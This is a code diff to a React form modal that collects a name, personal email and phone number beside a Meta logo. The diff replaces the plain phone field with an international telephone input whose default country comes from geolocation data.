@@ -1,9 +1,13 @@
-import { useState } from 'react';
+import { useState, useMemo } from 'react';
 import PropTypes from 'prop-types';
 import TickIcon from '@/assets/images/tick.svg';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
+import IntlTelInput from 'intl-tel-input/reactWithUtils';
+import 'intl-tel-input/styles';
+import { useStore } from '@/store/store';
 
 const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
+    const { geoInfo } = useStore();
     const [formData, setFormData] = useState({
         fullName: '',
         personalEmail: '',
@@ -13,6 +17,21 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
         agreeTerms: false
     });
     const [errors, setErrors] = useState({});
+
+    const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
+
+    const initOptions = useMemo(
+        () => ({
+            initialCountry: countryCode,
+            separateDialCode: true,
+            strictMode: true,
+            nationalMode: true,
+            autoPlaceholder: 'aggressive',
+            placeholderNumberType: 'MOBILE',
+            countrySearch: false
+        }),
+        [countryCode]
+    );
 
     const handleChange = (field, value) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -113,17 +132,15 @@ const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
                                 <label className="form-label" htmlFor="PhoneFirld">
                                     {texts.mobilePhone || 'Mobile Phone Number'}
                                 </label>
-                                <input
-                                    aria-describedby="emailHelp"
-                                    className={`form-control ${errors.phone ? 'is-invalid' : ''}`}
-                                    id="PhoneFirld"
-                                    maxLength="18"
-                                    minLength="7"
-                                    name="mobile-phone-number"
-                                    required
-                                    type="tel"
-                                    value={formData.phone}
-                                    onChange={(e) => handleChange('phone', e.target.value)}
+                                <IntlTelInput
+                                    onChangeNumber={(number) => handleChange('phone', number)}
+                                    initOptions={initOptions}
+                                    inputProps={{
+                                        name: 'mobile-phone-number',
+                                        id: 'PhoneFirld',
+                                        required: true,
+                                        className: `form-control ${errors.phone ? 'is-invalid' : ''}`
+                                    }}
                                 />
                             </div>
                             <div className="mb-3">
